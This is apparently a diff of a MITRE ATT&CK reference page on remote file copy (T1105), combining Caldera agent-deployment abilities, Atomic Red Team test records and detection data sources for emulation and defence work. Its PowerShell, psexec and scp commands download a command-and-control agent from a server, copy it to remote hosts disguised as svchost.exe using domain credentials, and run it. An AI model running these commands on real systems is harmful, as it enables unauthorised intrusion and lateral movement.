@@ -9,6 +9,12 @@
 
 Adversaries may also copy files laterally between internal victim systems to support Lateral Movement with remote Execution using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) or [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076).
 
+## Aliases
+
+```
+
+```
+
 ## Additional Attributes
 
 * Bypass: None
@@ -16,7 +22,7 @@ Adversaries may also copy files laterally between internal victim systems to sup
 * Network: True
 * Permissions: ['User']
 * Platforms: ['Linux', 'macOS', 'Windows']
-* Remote: intentionally left blank
+* Remote: None
 * Type: attack-pattern
 * Wiki: https://attack.mitre.org/techniques/T1105
 
@@ -105,7 +111,7 @@ del AtomicTestFileT1105.js /Q >nul 2>&1
 popd
 
 {'windows': {'psh': {'command': '$server="#{server}";\n$sharePath="#{share}";\nSet-Location $sharePath;$url="$($server)/file/download";\n$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");\n$wc.Headers.add("file","sandcat.go");($data=$wc.DownloadData($url)) -and\n($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"",""))\n-and ([io.file]::WriteAllBytes("$($sharePath)$name.exe",$data));\n$startServer="$($sharePath)$name.exe -server $($server) ";Invoke-Command\n-ScriptBlock {Param([string]$startServer, $sharePath, $name, $server)  Invoke-WmiMethod\n-Class Win32_Process -Name Create -ArgumentList "$($sharePath)$name.exe\n-server $server -v" } -ComputerName #{remote.host.name} -ArgumentList $startServer, $sharePath, $name, $server\n', 'cleanup': 'del sandcat.go-windows; Invoke-Command -ComputerName', 'payloads': ['sandcat.go-windows']}}}
-{'windows': {'psh,pwsh': {'command': '$job = Start-Job -ScriptBlock {\n  $username = "#{domain.user.name}";\n  $password = "#{domain.user.password}";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;\n  $location = "#{location}";\n  $exe = "#{exe_name}";\n  Copy-Item $location.replace($exe, "sandcat.go-windows") -Destination "C:\\Users\\Public\\svchost.exe" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n', 'cleanup': '$job = Start-Job -ScriptBlock {\n  $username = "#{domain.user.name}";\n  $password = "#{domain.user.password}";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;\n  Invoke-Command -Session $session -Command {Remove-Item "C:\\Users\\Public\\svchost.exe" -force};\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n', 'payloads': ['sandcat.go-windows']}}, 'darwin': {'sh': {'command': 'scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go\n', 'cleanup': "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm -f sandcat.go'\n", 'payloads': ['sandcat.go-darwin']}}, 'linux': {'sh': {'command': 'scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go\n', 'cleanup': "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm -f sandcat.go'\n", 'payloads': ['sandcat.go-linux']}}}
+{'windows': {'psh,pwsh': {'command': '$job = Start-Job -ScriptBlock {\n  $username = "#{domain.user.name}";\n  $password = "#{domain.user.password}";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;\n  $location = "#{location}";\n  $exe = "#{exe_name}";\n  Copy-Item $location.replace($exe, "sandcat.go-windows") -Destination "C:\\Users\\Public\\svchost.exe" -ToSession $session;\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n', 'cleanup': '$job = Start-Job -ScriptBlock {\n  $username = "#{domain.user.name}";\n  $password = "#{domain.user.password}";\n  $secstr = New-Object -TypeName System.Security.SecureString;\n  $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)};\n  $cred = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist $username, $secstr;\n  $session = New-PSSession -ComputerName "#{remote.host.name}" -Credential $cred;\n  Invoke-Command -Session $session -Command {Remove-Item "C:\\Users\\Public\\svchost.exe" -force};\n  Start-Sleep -s 5;\n  Remove-PSSession -Session $session;\n};\nReceive-Job -Job $job -Wait;\n', 'payloads': ['sandcat.go-windows']}}, 'darwin': {'sh': {'command': 'scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-darwin #{remote.ssh.cmd}:~/sandcat.go\n', 'cleanup': "ssh -o ConnectTimeout=3 #{remote.ssh.cmd} 'rm -f sandcat.go'\n", 'payloads': ['sandcat.go-darwin']}}, 'linux': {'sh': {'command': 'scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{remote.ssh.cmd}:~/sandcat.go\n', 'cleanup': "ssh -o ConnectTimeout=3 -o StrictHostKeyChecking=no #{remote.ssh.cmd} 'rm -f sandcat.go'\n", 'payloads': ['sandcat.go-linux']}}}
 {'windows': {'cmd': {'cleanup': 'del /f sandcat.go-windows && del /f \\\\#{remote.host.name}\\Users\\Public\\sandcat.go-windows.exe', 'command': 'net /y use \\\\#{remote.host.name} & copy /y sandcat.go-windows\n\\\\#{remote.host.name}\\Users\\Public & #{psexec.path} -accepteula \\\\#{remote.host.name}\ncmd /c start C:\\Users\\Public\\sandcat.go-windows -server #{server} -v\n', 'payloads': ['sandcat.go-windows']}}}
 {'windows': {'psh': {'command': '$path = "sandcat.go-windows";\n$drive = "\\\\#{remote.host.fqdn}\\C$";\nCopy-Item -v -Path $path -Destination $drive"\\Users\\Public\\svchost.exe";\n', 'cleanup': '$drive = "\\\\#{remote.host.fqdn}\\C$";\nRemove-Item -Path $drive"\\Users\\Public\\svchost.exe" -Force;\n', 'parsers': {'plugins.stockpile.app.parsers.54ndc47_remote_copy': [{'source': 'remote.host.fqdn', 'edge': 'has_54ndc47_copy'}]}, 'payloads': ['sandcat.go-windows']}}}
 ```
@@ -303,7 +309,8 @@ popd
                                            'ConnectTimeout=3 sandcat.go-darwin '
                                            '#{remote.ssh.cmd}:~/sandcat.go\n',
                                 'payloads': ['sandcat.go-darwin']}},
-              'linux': {'sh': {'cleanup': 'ssh -o ConnectTimeout=3 '
+              'linux': {'sh': {'cleanup': 'ssh -o ConnectTimeout=3 -o '
+                                          'StrictHostKeyChecking=no '
                                           "#{remote.ssh.cmd} 'rm -f "
                                           "sandcat.go'\n",
                                'command': 'scp -o StrictHostKeyChecking=no -o '
@@ -550,7 +557,19 @@ popd
                                  'Reegun J (OCBC Bank)'],
                   'status': 'experimental',
                   'tags': ['attack.command_and_control', 'attack.t1105'],
-                  'title': 'Malicious payload download via Office binaries'}}]
+                  'title': 'Malicious payload download via Office binaries'}},
+ {'data_source': ['4663', 'File monitoring']},
+ {'data_source': ['5156', 'Windows Firewall']},
+ {'data_source': ['4688', 'Process Execution']},
+ {'data_source': ['Packet capture']},
+ {'data_source': ['Netflow/Enclave netflow']},
+ {'data_source': ['Network protocol analysis']},
+ {'data_source': ['4663', 'File monitoring']},
+ {'data_source': ['5156', 'Windows Firewall']},
+ {'data_source': ['4688', 'Process Execution']},
+ {'data_source': ['Packet capture']},
+ {'data_source': ['Netflow/Enclave netflow']},
+ {'data_source': ['Network protocol analysis']}]
 ```
 
 ## Potential Queries
@@ -562,7 +581,8 @@ popd
 ## Raw Dataset
 
 ```json
-[{'Atomic Red Team Test - Remote File Copy': {'atomic_tests': [{'description': 'Utilize '
+[{'Atomic Red Team Test - Remote File Copy': {'atomic_tests': [{'auto_generated_guid': '0fc6e977-cb12-44f6-b263-2824ba917409',
+                                                                'description': 'Utilize '
                                                                                'rsync '
                                                                                'to '
                                                                                'perform '
@@ -613,7 +633,8 @@ popd
                                                                         '(push)',
                                                                 'supported_platforms': ['linux',
                                                                                         'macos']},
-                                                               {'description': 'Utilize '
+                                                               {'auto_generated_guid': '3180f7d5-52c0-4493-9ea0-e3431a84773f',
+                                                                'description': 'Utilize '
                                                                                'rsync '
                                                                                'to '
                                                                                'perform '
@@ -664,7 +685,8 @@ popd
                                                                         '(pull)',
                                                                 'supported_platforms': ['linux',
                                                                                         'macos']},
-                                                               {'description': 'Utilize '
+                                                               {'auto_generated_guid': '83a49600-222b-4866-80a0-37736ad29344',
+                                                                'description': 'Utilize '
                                                                                'scp '
                                                                                'to '
                                                                                'perform '
@@ -714,7 +736,8 @@ popd
                                                                         '(push)',
                                                                 'supported_platforms': ['linux',
                                                                                         'macos']},
-                                                               {'description': 'Utilize '
+                                                               {'auto_generated_guid': 'b9d22b9a-9778-4426-abf0-568ea64e9c33',
+                                                                'description': 'Utilize '
                                                                                'scp '
                                                                                'to '
                                                                                'perform '
@@ -764,7 +787,8 @@ popd
                                                                         '(pull)',
                                                                 'supported_platforms': ['linux',
                                                                                         'macos']},
-                                                               {'description': 'Utilize '
+                                                               {'auto_generated_guid': 'f564c297-7978-4aa9-b37a-d90477feea4e',
+                                                                'description': 'Utilize '
                                                                                'sftp '
                                                                                'to '
                                                                                'perform '
@@ -816,7 +840,8 @@ popd
                                                                         '(push)',
                                                                 'supported_platforms': ['linux',
                                                                                         'macos']},
-                                                               {'description': 'Utilize '
+                                                               {'auto_generated_guid': '0139dba1-f391-405e-a4f5-f3989f2c88ef',
+                                                                'description': 'Utilize '
                                                                                'sftp '
                                                                                'to '
                                                                                'perform '
@@ -866,7 +891,8 @@ popd
                                                                         '(pull)',
                                                                 'supported_platforms': ['linux',
                                                                                         'macos']},
-                                                               {'description': 'Use '
+                                                               {'auto_generated_guid': 'dd3b61dd-7bbc-48cd-ab51-49ad1a776df0',
+                                                                'description': 'Use '
                                                                                'certutil '
                                                                                '-urlcache '
                                                                                'argument '
@@ -910,7 +936,8 @@ popd
                                                                         'download '
                                                                         '(urlcache)',
                                                                 'supported_platforms': ['windows']},
-                                                               {'description': 'Use '
+                                                               {'auto_generated_guid': 'ffd492e3-0455-4518-9fb1-46527c9f241b',
+                                                                'description': 'Use '
                                                                                'certutil '
                                                                                '-verifyctl '
                                                                                'argument '
@@ -977,7 +1004,8 @@ popd
                                                                         'download '
                                                                         '(verifyctl)',
                                                                 'supported_platforms': ['windows']},
-                                                               {'description': 'This '
+                                                               {'auto_generated_guid': 'a1921cd3-9a2d-47d5-a891-f1d0f2a7a31b',
+                                                                'description': 'This '
                                                                                'test '
                                                                                'uses '
                                                                                'BITSAdmin.exe '
@@ -1038,7 +1066,8 @@ popd
                                                                         'BITS '
                                                                         'Download',
                                                                 'supported_platforms': ['windows']},
-                                                               {'description': 'This '
+                                                               {'auto_generated_guid': '42dc4460-9aa6-45d3-b1a6-3955d34e1fe8',
+                                                                'description': 'This '
                                                                                'test '
                                                                                'uses '
                                                                                'PowerShell '
@@ -1083,7 +1112,8 @@ popd
                                                                         'PowerShell '
                                                                         'Download',
                                                                 'supported_platforms': ['windows']},
-                                                               {'description': 'OSTap '
+                                                               {'auto_generated_guid': '2ca61766-b456-4fcf-a35a-1233685e1cad',
+                                                                'description': 'OSTap '
                                                                                'copies '
                                                                                'itself '
                                                                                'in '
@@ -1263,6 +1293,8 @@ popd
                                                                                                       'linux': {'sh': {'cleanup': 'ssh '
                                                                                                                                   '-o '
                                                                                                                                   'ConnectTimeout=3 '
+                                                                                                                                  '-o '
+                                                                                                                                  'StrictHostKeyChecking=no '
                                                                                                                                   '#{remote.ssh.cmd} '
                                                                                                                                   "'rm "
                                                                                                                                   '-f '
